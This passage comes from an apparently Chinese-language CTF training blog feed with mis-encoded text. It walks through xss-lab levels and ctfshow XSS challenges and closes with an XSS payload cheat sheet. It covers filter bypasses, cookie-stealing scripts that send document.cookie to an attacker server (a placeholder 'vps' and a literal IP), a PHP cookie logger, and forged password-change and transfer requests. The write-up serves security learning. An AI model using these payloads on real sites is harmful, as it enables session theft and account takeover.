//è¿”å›ä¸Šä¸€æ¬¡å‘½ä»¤<br>$((${_}))=0<br>$((~$((${_}))))=-1</p></blockquote><p>payload ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">num = <span class="hljs-string">&quot;$((~$((&quot;</span>+<span class="hljs-string">&quot;$((~$(())))&quot;</span>*<span class="hljs-number">37</span>+<span class="hljs-string">&quot;))))&quot;</span>//<span class="hljs-number">36</span><br><span class="hljs-built_in">print</span>(num)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSSç¬”è®°</title>
    <link href="/2021/07/21/XSS%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/07/21/XSS%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>æ›´æ”¹ test ä¸º 2 æˆåŠŸæ˜¾ç¤º 2</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161249161.png"></p><p>è¾“å…¥<code>&lt;script&gt;&lt;/script&gt;</code>æ²¡æœ‰æ˜¾ç¤º æŒ‰ç†æ¥è¯´åº”è¯¥ä¼šå‡ºç°æ¬¢è¿ç”¨æˆ·<code>&lt;script&gt;&lt;/script&gt;</code>æ‰å¯¹ï¼Œä½†æ˜¯æ²¡æœ‰ï¼Œåˆ°å“ªé‡Œå»äº†ï¼Œä»–è¢«æµè§ˆå™¨è§£æäº†ï¼Œåœ¨è¿™ä¸ªæ ‡ç­¾ä¸­å°±å¯ä»¥æ’å…¥ä½ æƒ³æ‰§è¡Œçš„ js ä»£ç <img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721231844489.png"></p><p>éœ€è¦å¼¹çª—æ‰èƒ½ä¸‹ä¸€å…³</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721231540223.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721160805637.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721232021324.png"></p><p>æœ‰è¾“å…¥æ¡† ç›´æ¥æ’å…¥å¤±è´¥ åœ¨æŸ¥çœ‹å™¨çœ‹ä¸€ä¸‹æºç </p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161841692.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721232250230.png"></p><p>å‘ç°ä¸Šé¢çš„æ–‡å­—å†…å®¹è¢« html å®ä½“åŒ–ç¼–ç äº†ï¼Œä½†æ˜¯ä¸‹é¢è¾“å…¥æ¡†é‡Œè¿˜ä¼šæ˜¾ç¤ºåŸå†…å®¹ï¼Œä½†æ˜¯åœ¨ value å€¼å†…æµè§ˆå™¨æ— æ³•è§£æï¼ŒæŠŠ value å±æ€§é—­åˆï¼Œå†æŠŠ<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>â€é€ƒé€¸å‡ºå»â€œ ==&gt; æ„é€ <code>&gt;&quot;&lt;script&gt;&lt;/script&gt;//</code>, <code>//</code>æ˜¯ä¸ºäº†æ³¨é‡Šåé¢åŸæœ‰çš„<code>&gt;&quot;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161733218.png"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721162035732.png"></p><p>å‘ç°è¿ value å€¼é‡Œçš„å†…å®¹éƒ½è¢«å®ä½“åŒ–ç¼–ç äº†ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦å°è¯•å…¶ä»–åŠæ³•æ¥æ‰§è¡Œ js ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬ä¼ å…¥çš„å€¼æ˜¯åœ¨ input æ ‡ç­¾ä¸­çš„ï¼Œè€Œæ ‡ç­¾éƒ½æœ‰å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ä»–æ·»åŠ ä¸€ä¸ªå±æ€§ï¼Œåˆ©ç”¨è¿™ä¸ªå±æ€§æ¥æ‰§è¡Œ js ä»£ç ,åŒå¼•å·é—­åˆå¤±è´¥å°±å°è¯•å•å¼•å·é—­åˆ value</p><blockquote><p>â€˜onmouseover=â€™javascript:alert(1)</p><p>â€˜onmouseover=â€™alert(1)â€™</p></blockquote><p>è¿™é‡Œ onmouseover æ˜¯åµŒå…¥åˆ° input ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä»–çš„ä½œç”¨æ˜¯é¼ æ ‡æ»‘è¿‡æ—¶æ‰§è¡Œ javascript ä»£ç ï¼ŒæˆåŠŸç»•è¿‡ã€‚</p><p>è¿˜æœ‰ onclickï¼Œä»–çš„ä½œç”¨æ˜¯ç‚¹å‡»æ—¶æ‰§è¡Œ</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>å’Œå‰ä¸€å…³ä¸åŒçš„æ˜¯ä½¿ç”¨äº†åŒå¼•å·è¿›è¡Œé—­åˆ</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724113402660.png"></p><p>script è¢«æ’è¿›äº†ä¸‹åˆ’çº¿ è¯´æ˜åŒ¹é…äº†&lt;script&gt; åŒå†™ å¤§å°å†™å¯ä»¥å°è¯• éƒ½è¡Œä¸é€š</p><p>æ¢ä¸ªæ ‡ç­¾è¯•ä¸€è¯•</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724113621774.png"></p><p>åŒæ ·æ„é€ é—­åˆ</p><blockquote><p>â€œ&gt;&lt;a href=javascript:alert(1)&gt;click on&lt;/a&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724115942750.png"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>æµ‹è¯•å‘ç°ç¬¬äº”å…³çš„åŸºç¡€ä¸Šå¯¹ herf è¿›è¡Œäº†åŒ¹é… è¿›è¡Œå¤§å°å†™ç»•è¿‡</p><blockquote><p>â€œ&gt;&lt;a Href=javascript:alert(1)&gt;click on&lt;/a&gt;</p></blockquote><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>ç¬¬äº”å…³æåˆ°çš„åŒå†™è¿™é‡Œå‡ºç°äº†<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724223917009.png"></p><p>å¯ä»¥çœ‹åˆ°æäº¤åæ ‡ç­¾é‡Œçš„ script ä¸å†æ˜¯æ’å…¥ä¸‹åˆ’çº¿ è€Œæ˜¯æ›¿æ¢ä¸ºç©º é‚£ä¹ˆå°è¯•åŒå†™<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724224133906.png"></p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225137053.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225156651.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225227736.png"></p><p>ç‚¹å‡»é“¾æ¥å</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225301905.png"></p><p>åŸæ¥ javascript è¢«è¿‡æ»¤äº† å¯ä»¥å°†è¿™ä¸ªè¿›è¡Œç¼–ç ç»•è¿‡ æ¯”å¦‚å°†æœ€åä¸€ä¸ªå­—ç¬¦è¿›è¡Œç¼–ç <img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225948421.png"></p><p>å¾—åˆ°<code>javascrip&amp;#116:alert()</code>æ”¾å…¥æ¡†é‡Œæ·»åŠ é“¾æ¥ ç„¶åç‚¹å‡»é“¾æ¥å³å¯</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>æ— è®ºä»€ä¹ˆéƒ½æ˜¯é“¾æ¥ä¸åˆæ³• çœ‹ä¸€ä¸‹ wp è¯´éœ€è¦<code>http://</code> è€Œä¸”ä¸èƒ½å› ä¸ºæœ‰<code>http://</code>å½±å“æ³¨å…¥</p><p>é‚£ä¹ˆå°±æ³¨é‡Šæ‰</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724231259786.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724231254317.png"></p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224553446.png"></p><p>ç›´æ¥æ’å…¥ä¸è¡Œ æŸ¥çœ‹æºç å‘ç°æœ‰ä¸‰ä¸ª input æ˜¯ hidden çš„ åˆ†åˆ«ä¼ å‚å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224355595.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224412941.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224450585.png"></p><blockquote><p>t_sort=â€ type=â€textâ€ onmouseover=alert() â€œ</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726230555125.png"></p><p>é¼ æ ‡åˆ’è¿‡æ–‡æœ¬æ¡†</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726230610328.png"></p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>ä»ç„¶ä½¿ç”¨ä¸Šä¸€å…³çš„æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728171409093.png"></p><p>å‘ç°è¢«å®ä¾‹åŒ– è¿™ä¸ª t_ref å‚æ•°æ€ä¹ˆåˆ©ç”¨ url é‡Œä¼ å¥½åƒä¼ ä¸è¿›å»</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728173918864.png"></p><p>ä½†æ˜¯ä»è¿™é‡Œå¯ä»¥å‘ç° ref åº”è¯¥æ˜¯ refer</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174023540.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174042560.png"></p><p>ä¸€ä¼ è¿›å»å°±æ˜¯å‡ºç°æ–‡æœ¬æ¡†äº†<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174109292.png"></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174639889.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174626300.png"></p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>ç†æ‰€å½“ç„¶çš„<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174839524.png"></p><p>é¢æ²¡æœ‰ååº” æŠ“åŒ…ï¼<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728211436470.png"></p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802013507101.png"></p><p>è¢«æ›¿æ¢ä¸ºç©ºæ ¼ æ³¨æ„ç©ºæ ¼å’Œç©ºå­—ç¬¦ä¸ä¸€æ · å°è¯•äº†å¤§å°å†™æ— æ•ˆ</p><p>å°è¯•å›¾ç‰‡æ ‡ç­¾</p><blockquote><p>keyword=&lt;img src=1 Î¿nerrÎ¿r=alert()&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802013807695.png"></p><p>å¯è§ ç©ºæ ¼è¢«å®ä½“åŒ–äº† %0a ç»•è¿‡</p><blockquote><p>&lt;img%0asrc=1%0aonerror=alert()&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802014135142.png"></p><h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><p>xss å¹³å°ä»£ç æ’å…¥åæç¤ºä¸æ˜¯ç®¡ç†å‘˜ï¼Œè¯´æ˜æˆ‘ä»¬ä¸èƒ½æ’è‡ªå·±ï¼Œå¾—æ’ç®¡ç†å‘˜</p><p>payloadï¼š</p><blockquote><p>&lt;scrpit&gt;document.location.href=â€™<a href="http://vps/getcookie.php?cookie=&#39;+document.cookie\">http://vps/getcookie.php?cookie=&#39;+document.cookie\</a>&lt;/script&gt;</p><p>&lt;body onload=â€document.location.href=â€™<a href="http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\">http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\</a>&lt;/body&gt;</p></blockquote><p>getcookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Cookie</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$Cookie</span>))&#123;<br><span class="hljs-variable">$action</span> = fopoen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;The file create failed!&quot;</span>);<br>fwrite(<span class="hljs-variable">$action</span>,<span class="hljs-variable">$Cookie</span>,<span class="hljs-string">&quot;\n&quot;</span>);<br>fclose(<span class="hljs-variable">$Cookie</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The Cookie has dump!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Nothing input!&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>ctfshow328</li></ul><p>æŸ¥çœ‹åŠŸèƒ½ç‚¹ï¼Œæ³¨å†Œï¼Œç™»å½•ï¼Œå‡ä¸èƒ½æŸ¥çœ‹åˆ° flagï¼Œéœ€è¦ç®¡ç†å‘˜ç™»å½•</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195236357.png"></p><p>æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªå¯†ç è·å¾— cookie</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195756121.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195828394.png"></p><p>åœ¨æµè§ˆå™¨ä¼ªé€ ä¸€ä¸‹ cookieï¼Œæˆ‘ä»¬åªçœ‹åˆ°äº†ä¸€é—ªè€Œè¿‡çš„é¡µé¢ï¼Œç„¶åå°±åˆ°äº†æˆ‘ä»¬è„šæœ¬çš„å›æ˜¾ï¼Œè¯´é¢æ˜¯æ‰§è¡ŒæˆåŠŸçš„ï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200724719.png"></p><p>å¯¹æ¯”å¾—çŸ¥ï¼Œè¿™é‡Œè¿˜æœ‰è¯·æ±‚åŒ…æ‰å¯¹ï¼Œæˆ‘ä»¬è¦æŠ“å–è¿™ä¸ªè¯·æ±‚åŒ…ï¼Œå¹¶ä¸”é˜²æ­¢å®ƒè·³è½¬</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195949954.png"></p><p>è¯¢é—®å‡ºé¢˜äººå¾—çŸ¥ï¼Œè¿™é‡Œé‡‡ç”¨äº† databaseï¼Œjs è·å– ajaxï¼Œæ‰€ä»¥è¯´æ˜è¿™é‡Œå‘åŒ…åè¿˜æœ‰ä¸€ä¸ªåŒ…æ²¡æœ‰è·å¾—ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ proxy æ¨¡å—ä¸€ä¸ªä¸€ä¸ªæŠ“</p><p>åœ¨å‘é€äº†ç®¡ç†å‘˜ cookie åï¼ŒæŠŠç¬¬ä¸€ä¸ªåŒ…æ”¾æ‰ï¼ŒæŠŠ js è¯·æ±‚ ajax è¯·æ±‚çš„åŒ…æŠ“å–ä¸‹æ¥</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200228393.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200412268.png"></p><p>å¯ä»¥ä»æ§åˆ¶å°çš„æ€§èƒ½(å¯ç”¨é«˜çº§ç»˜åˆ¶æ’æ¡©ï¼Œè®¾ç½® cpu å’Œç½‘ç»œå€é€Ÿ)é‡Œé¢æŸ¥çœ‹åˆ°ä¸€é—ªè€Œè¿‡çš„ç”»é¢ï¼Œæˆ‘ä»¬åœ¨æ—¶é—´è½´å¯ä»¥çœ‹åˆ°</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021210045312.png"></p><p>æ­¤æ—¶è¿˜æœ‰ä¸€ä¸ªè¯·æ±‚</p><ul><li>ctfshow 329</li></ul><p>ç™»å½•åå°±æ³¨é”€æ‰å½“å‰ cookieï¼Œä»è€Œæ²¡æœ‰åŠæ³•ç”¨æ‰€è·å¾—çš„ cookie è¿›è¡Œç™»å½•ï¼Œæˆ‘ä»¬ç›´æ¥ xss è¯»å–æºç å‘é€åˆ° vps ä¸Šæ¥å—</p><p>å…ˆåœ¨è¡¨ä¸­æ’å…¥ä¸€ä¸ªæ•°æ®ï¼Œç„¶åæ§åˆ¶å°å°è¯•è¾“å‡ºä»–çš„å±æ€§ï¼Œä¸ºåé¢æ„é€  payload åšå‡†å¤‡</p><p>è¿™é‡Œä½¿ç”¨äº† jquery çš„éå†</p><blockquote><p>&lt;script&gt;$(â€˜.laytable-cell-1-0-1â€™).each(function(index,value){if(value.innerHTML.indexOf(â€˜ctfâ€™+â€™show{â€˜)&gt;-1){window.location.href=â€<a href="http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;%7D%7D);%5C">http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;}});\</a>&lt;/script&gt;</p></blockquote><ul><li>ctfshow 330ã€331</li></ul><p>æœ‰ä¸ªä¿®æ”¹å¯†ç çš„åŠŸèƒ½ï¼ŒæŠ“åŒ…<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211024144417192.png"></p><p>å¾ˆè‡ªç„¶çš„æƒ³æ³•å°±æ˜¯è®©ç®¡ç†å‘˜å‘å‡ºè¿™ä¸ªåŒ…ï¼Œç„¶åä»¥ 123456 ç™»å½•å³å¯</p><p>æ³¨å†Œä¸€ä¸ªå¯†ç </p><blockquote><p>&lt;script&gt;window.location.href=â€™<a href="http://127.0.0.1/api/change.php?p=123456&#39;;\">http://127.0.0.1/api/change.php?p=123456&#39;;\</a>&lt;/script&gt;</p></blockquote><p>æ²¡æœ‰ç”¨ï¼Œå†çœ‹ä¸€çœ‹é¢˜ç›®å¾ˆè´´å¿ƒçš„å‘Šè¯‰ä½ åº”è¯¥æ”¾åœ¨ç”¨æˆ·åé‡Œ<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211024145254601.png"></p><p>ç”¨ admin-123456 æˆåŠŸç™»å½•</p><ul><li>ctfshow332</li></ul><p>æ³¨å†Œç™»å½•ä¸€ä¸ªè´¦å·ï¼Œç»™ admin è½¬è´¦-10000 å³å¯(æœ‰æ¯’ï¼Œæˆ‘æ€ä¹ˆæéƒ½æ˜¯æœ‰å†…é¬¼)</p><p>ç»ˆäºæˆåŠŸäº†</p><ul><li>ctfshow333</li></ul><p>332 çš„åŸºç¡€ä¸Šä¸èƒ½è½¬è´Ÿæ•°äº†</p><p>å¯ä»¥ç»™è‡ªå·±è½¬ï¼Œæ¯æ¬¡çš„è½¬è´¦é‡‘é¢ä¸èƒ½å¤§äºå½“å‰çš„é‡‘é¢</p><p>æ¯”å¦‚ï¼šè½¬è´¦ 1 å…ƒï¼Œbp æŠ“ä¸€ä¸‹ï¼Œçˆ†ç ´ 1000 æ¬¡(1005ï¼‰ï¼Œå†æ”¹ä¸€ä¸‹è½¬è´¦å‚æ•°ä¸º 1000ï¼Œçˆ†ç ´ 10 æ¬¡</p><p>æˆ–è€…ï¼š</p><p>æ³¨å†Œä¸¤ä¸ªè´¦å·ï¼Œå…¶ä¸­ä¸€ä¸ªè´¦å·çš„è´¦å·ä¸ºï¼š</p><blockquote><p>&lt;script&gt; $.ajax({url:â€™<a href="http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\">http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\</a>&lt;/script&gt;</p></blockquote><h2 id="xss-çš„æ”»é˜²ï¼š"><a href="#xss-çš„æ”»é˜²ï¼š" class="headerlink" title="xss çš„æ”»é˜²ï¼š"></a>xss çš„æ”»é˜²ï¼š</h2><h3 id="å¸¸ç”¨-HTML-æ ‡ç­¾"><a href="#å¸¸ç”¨-HTML-æ ‡ç­¾" class="headerlink" title="å¸¸ç”¨ HTML æ ‡ç­¾"></a>å¸¸ç”¨ HTML æ ‡ç­¾</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">iframe</span>&gt;    <span class="hljs-selector-tag">iframe</span> å…ƒç´ ä¼šåˆ›å»ºåŒ…å«å¦ä¸€ä¸ªæ–‡æ¡£çš„å†…è”æ¡†æ¶ã€‚<br><br>&lt;<span class="hljs-selector-tag">textarea</span>&gt;   <span class="hljs-selector-tag">textarea</span> æ ‡ç­¾å®šä¹‰å¤šè¡Œçš„æ–‡æœ¬è¾“å…¥æ§ä»¶<br><br>&lt;<span class="hljs-selector-tag">img</span>&gt;        <span class="hljs-selector-tag">img</span>  å…ƒç´ å‘ç½‘é¡µä¸­åµŒå…¥å›¾åƒã€‚<br><br>&lt;script&gt;     script æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚javascript.<br>             script å…ƒç´ æ—¢å¯ä»¥åŒ…å«è„šæœ¬è¯­å¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ <span class="hljs-attribute">src</span> å±æ€§æŒ‡å‘å¤–éƒ¨è„šæœ¬æ–‡ä»¶ã€‚<br>             å¿…é¡»çš„ type å±æ€§è§„å®šè„šæœ¬çš„ MIME ç±»å‹<br>             javascript çš„å¸¸è§åº”ç”¨æ˜¯å›¾åƒæ“ä½œã€è¡¨å•éªŒè¯ä»¥åŠåŠ¨æ€å†…å®¹æ›´æ–°ã€‚<br></code></pre></td></tr></table></figure><h3 id="å¸¸ç”¨-javascript-æ–¹æ³•"><a href="#å¸¸ç”¨-javascript-æ–¹æ³•" class="headerlink" title="å¸¸ç”¨ javascript æ–¹æ³•"></a>å¸¸ç”¨ javascript æ–¹æ³•</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">alert        alert() æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¸¦æœ‰ä¸€æ¡æŒ‡å®šæ¶ˆæ¯å’Œä¸€ä¸ªç¡®è®¤æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚<br><br>window.<span class="hljs-keyword">location</span>   <span class="hljs-title">ç”¨äºè·å¾—å½“å‰é¡µé¢çš„åœ°å€url</span>ï¼Œå¹¶æŠŠæµè§ˆå™¨é‡å®šå‘åˆ°æ–°çš„é¡µé¢ã€‚<br><br>location.href     è¿”å›å½“å‰æ˜¾ç¤ºçš„æ–‡æ¡£çš„å®Œæ•´ URL<br><br>onload            ä¸€å¼ é¡µé¢æˆ–ä¸€å¹…å›¾åƒå®ŒæˆåŠ è½½<br><br>onsubmit           ç¡®è®¤æŒ‰é’®è¢«ç‚¹å‡»<br><br>onerror            åœ¨åŠ è½½æ–‡æ¡£æˆ–å›¾åƒæ—¶å‘ç”Ÿé”™è¯¯<br></code></pre></td></tr></table></figure><h3 id="æ„é€ -XSS-è„šæœ¬"><a href="#æ„é€ -XSS-è„šæœ¬" class="headerlink" title="æ„é€  XSS è„šæœ¬"></a>æ„é€  XSS è„šæœ¬</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs xml">å¼¹çª—è­¦å‘Š<br>æ­¤è„šæœ¬å®ç°å¼¹çª—æ¡†æç¤ºï¼Œä¸€èˆ¬ä½œä¸ºæ¼æ´æµ‹è¯•æˆ–è€…æ¼”ç¤ºä½¿ç”¨ï¼Œç±»ä¼¼SQLæ³¨å…¥æµ‹è¯•ä¸­çš„å•å¼•å·ï¼Œä¸€æ—¦è„šæœ¬èƒ½æ‰§è¡Œï¼Œä¹Ÿå°±æ„å‘³ç€åç«¯æœåŠ¡å™¨æ²¡æœ‰å¯¹ç‰¹æ®Šå­—ç¬¦åšè¿‡æ»¤ <span class="hljs-tag">&lt;&gt;</span> \ &#x27; ,è¿™æ ·å°±å¯ä»¥è¯æ˜ï¼Œè¿™ä¸ªé¡µé¢å­˜åœ¨xssæ¼æ´ã€‚<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>é¡µé¢åµŒå¥—<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">300</span> <span class="hljs-attr">height</span>=<span class="hljs-string">300</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">0</span> <span class="hljs-attr">height</span>=<span class="hljs-string">0</span> <span class="hljs-attr">border</span>=<span class="hljs-string">0</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>é¡µé¢é‡å®šå‘<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">windows.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>å¼¹çª—è­¦å‘Šå¹¶é‡å®šå‘<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;hello world!&quot;</span>);location.href=<span class="hljs-string">&quot;http:/www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>è®¿é—®æ¶æ„ä»£ç <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.xxx.com/xx.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>å¯ç»“åˆ beef æ”¶é›†ç”¨æˆ·cookie<br><br>å·§ç”¨å›¾ç‰‡æ ‡ç­¾<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> 